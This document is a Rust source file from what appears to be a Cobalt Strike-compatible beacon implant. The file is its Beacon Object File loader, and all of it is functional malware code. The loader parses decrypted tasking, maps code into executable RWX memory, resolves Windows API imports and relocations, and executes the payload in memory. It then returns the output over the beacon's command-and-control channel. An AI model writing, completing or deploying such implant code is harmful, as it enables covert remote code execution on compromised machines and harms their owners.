#[cfg(target_os = "windows")]
mod bof_api;
#[path = "../../util/mod.rs"]
mod util;

use std::ffi::{c_char, c_void, CStr};
use std::io::{Cursor, Read};
use std::ptr::null_mut;
use std::{io, ptr, slice};

use windows_sys::core::PCSTR;

use crate::beacon::bof::bof_api::{
    get_beacon_function_ptr, DATA_SECTION_RELOC, DYNAMIC_FUNC_RELOC, EXE_SECTION_RELOC,
    INTERNAL_FUNCTION_NAMES, MULTI_RELOC, OUTPUT, RDATA_SECTION_RELOC, RELOCATION, RELOC_ADDR32,
    RELOC_REL32, RELOC_UNK_10,
};
use crate::beacon::bof::util::data_parse::beacon_read_i32;
use crate::util::data_parse::{beacon_read_length_and_string, beacon_send_result};
use crate::util::encode::convert_to_utf8_bytes;
use crate::util::jobs::CALLBACK_OUTPUT;
use crate::util::strike;
use crate::{BEACON, COUNTER};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};

pub fn bof_loader(mut decrypted_cursor: Cursor<Vec<u8>>) {
    unsafe {
        OUTPUT.output.clear(); // 在开始时清空输出缓冲区
    }
    let _cmd_len = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let entry_point = beacon_read_i32(&mut decrypted_cursor).unwrap();

    // code section
    let (code_size, mut code) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    // rdata section
    let (_, rdata) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    // data section
    let (_, data) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    // relocations section
    let (_, relocations) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    // args section
    let (args_len, args) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    let mut img = unsafe {
        VirtualAlloc(
            null_mut(),
            code_size as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    let mut offset = 0;
    let relocation_size = std::mem::size_of::<RELOCATION>();
    loop {
        let relocation: &RELOCATION = unsafe {
            // 从 relocations 的偏移位置读取一个 RELOCATION 结构体
            &*(relocations[offset..offset + relocation_size].as_ptr() as *const RELOCATION)
        };
        unsafe {
            match relocation.sof.section {
                MULTI_RELOC => {
                    break;
                }
                RDATA_SECTION_RELOC => {
                    process_relocation(
                        relocation,
                        &mut code,
                        img as *const u8,
                        rdata.as_ptr(),
                        relocation.e_offset_in_section,
                    );
                    offset += relocation_size;
                }
                DATA_SECTION_RELOC => {
                    process_relocation(
                        relocation,
                        &mut code,
                        img as *const u8,
                        data.as_ptr(),
                        relocation.e_offset_in_section,
                    );
                    offset += relocation_size;
                }
                EXE_SECTION_RELOC => {
                    process_relocation(
                        relocation,
                        &mut code,
                        img as *const u8,
                        img as *const u8,
                        relocation.e_offset_in_section,
                    );
                    offset += relocation_size;
                }
                DYNAMIC_FUNC_RELOC => {
                    offset += relocation_size;

                    let module_name = match read_name_from_relocations(&relocations, &mut offset) {
                        Ok(name) => name,
                        Err(e) => {
                            eprintln!("Error reading module_name: {}", e);
                            return;
                        }
                    };

                    let proc_name = match read_name_from_relocations(&relocations, &mut offset) {
                        Ok(name) => name,
                        Err(e) => {
                            eprintln!("Error reading proc name: {}", e);
                            return;
                        }
                    };

                    let mut module_handle =
                        unsafe { GetModuleHandleA(module_name.as_ptr() as PCSTR) };
                    if module_handle.is_null() {
                        module_handle = LoadLibraryA(module_name.as_ptr() as PCSTR);
                    }

                    let proc = GetProcAddress(module_handle, proc_name.as_ptr() as PCSTR);
                    let proc_ptr: *const u8 = match proc {
                        Some(func) => func as *const () as *const u8,
                        None => std::ptr::null(),
                    };

                    let pfun = store_u64_and_get_pointer(proc_ptr as i64);
                    process_relocation(
                        relocation,
                        &mut code,
                        img as *const u8,
                        pfun as *const u8,
                        0,
                    );
                }
                _ => {
                    // bof 内置函数
                    let proc = get_beacon_function_ptr(
                        INTERNAL_FUNCTION_NAMES[relocation.sof.section as usize],
                    );

                    let proc_ptr: *const u8 = match proc {
                        Ok(address) => address as *const u8,
                        Err(e) => {
                            eprintln!("Error occurred: {}", e);
                            return; // 或者你可以根据需求选择如何处理错误
                        }
                    };

                    let pfun = store_u64_and_get_pointer(proc_ptr as i64);
                    process_relocation(
                        relocation,
                        &mut code,
                        img as *const u8,
                        pfun as *const u8,
                        0,
                    );

                    offset += relocation_size;
                }
            }
        }
    }
    unsafe {
        ptr::copy_nonoverlapping(code.as_ptr(), img as *mut u8, code_size as usize);
    }

    // 将 img + entryPoint 转换为函数指针，并调用它
    let entrypoint: extern "C" fn(*const u8, usize) =
        unsafe { std::mem::transmute(img.add(entry_point as usize)) };

    // Call the entrypoint
    entrypoint(args.as_ptr(), args_len as usize);

    let success = unsafe { VirtualFree(img, 0, MEM_RELEASE) };
    if success == 0 {
        println!("Failed to free memory");
    }

    // 仅在 debug 模式下打印
    if cfg!(debug_assertions) {
        println!("Memory freed successfully");
    }

    let mut result;
    unsafe {
        result = convert_c_char_to_u8(&OUTPUT.output);
    }
    let utf8_bytes = match convert_to_utf8_bytes(&result) {
        Ok(bytes) => bytes,
        Err(e) => {
            eprintln!("Error: {}", e);
            return; // 如果有错误，返回
        }
    };
    unsafe {
        match beacon_send_result(&utf8_bytes, &BEACON, CALLBACK_OUTPUT) {
            // Ok(()) => println!("Beacon result sent successfully!"),
            Ok(()) => (),
            Err(e) => eprintln!("Failed to send beacon result: {}", e),
        }
    }
}
// 重定位处理函数
fn process_relocation(
    relocation: &RELOCATION,
    code: &mut [u8],
    img: *const u8,
    p_section: *const u8,
    offset_in_section: u32,
) -> bool {
    unsafe {
        if cfg!(target_pointer_width = "64") && relocation.r_type < RELOC_UNK_10 {
            let code_offset = relocation.r_offset as usize;
            let code_ptr = code.as_ptr().offset(code_offset as isize) as *const u32;
            let img_ptr =
                img.offset(code_offset as isize + relocation.r_type as isize) as *const u32;
            let section_ptr = p_section.offset(offset_in_section as isize) as *const u32;

            // 使用 read_unaligned 读取未对齐的值
            let code_value = ptr::read_unaligned(code_ptr);
            let img_value = img_ptr as i64;
            let section_value = section_ptr as i64;

            // 计算新的值
            let new_value = code_value as i64 + section_value - img_value;
            if new_value > i32::MAX as i64 / 2 || new_value < i32::MIN as i64 {
                println!("ERROR: Relocation truncated to fit");
                return false;
            }
            // 使用 `offset` 进行指针算术运算，确保对齐
            let code_mut_ptr = code.as_mut_ptr().offset(code_offset as isize) as *mut u32;
            ptr::write_unaligned(code_mut_ptr, new_value as u32);
        } else if !cfg!(target_pointer_width = "64") && relocation.r_type == RELOC_ADDR32 {
            let code_offset = relocation.r_offset as usize;
            let new_value = (*(code.as_ptr().add(code_offset) as *const i32))
                + (p_section.add(offset_in_section as usize) as isize) as i32;
            *(code.as_mut_ptr().add(code_offset) as *mut i32) = new_value;
        } else if !cfg!(target_pointer_width = "64") && relocation.r_type == RELOC_REL32 {
            let code_offset = relocation.r_offset as usize;
            let new_value = (*(code.as_ptr().add(code_offset) as *const i32))
                + ((p_section.add(offset_in_section as usize) as isize)
                    - (img.add(code_offset + 4) as isize)) as i32;
            *(code.as_mut_ptr().add(code_offset) as *mut i32) = new_value;
        } else {
            eprintln!("Un-implemented relocation type {}", relocation.r_type);
            return false;
        }

        true
    }
}
fn store_u64_and_get_pointer(value: i64) -> *mut i64 {
    unsafe {
        let ptr = VirtualAlloc(
            null_mut(),
            std::mem::size_of::<u64>(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ) as *mut i64;

        if ptr.is_null() {
            panic!("VirtualAlloc failed");
        }

        ptr.write(value);

        ptr
    }
}

fn convert_c_char_to_u8(c_char_slice: &[c_char]) -> &[u8] {
    // 使用 from_raw_parts 将 c_char 的引用转换为 u8 的引用
    unsafe { slice::from_raw_parts(c_char_slice.as_ptr() as *const u8, c_char_slice.len()) }
}
fn read_name_from_relocations(
    relocations: &[u8],
    offset: &mut usize,
) -> Result<String, Box<dyn std::error::Error>> {
    // 读取名称的长度（4字节表示长度）
    let name_length = u32::from_be_bytes(relocations[*offset..*offset + 4].try_into()?) as usize;
    *offset += 4;

    // 读取名称
    let name_data = &relocations[*offset..*offset + name_length];
    let name = String::from_utf8_lossy(name_data).to_string();
    *offset += name_length;

    Ok(name)
}
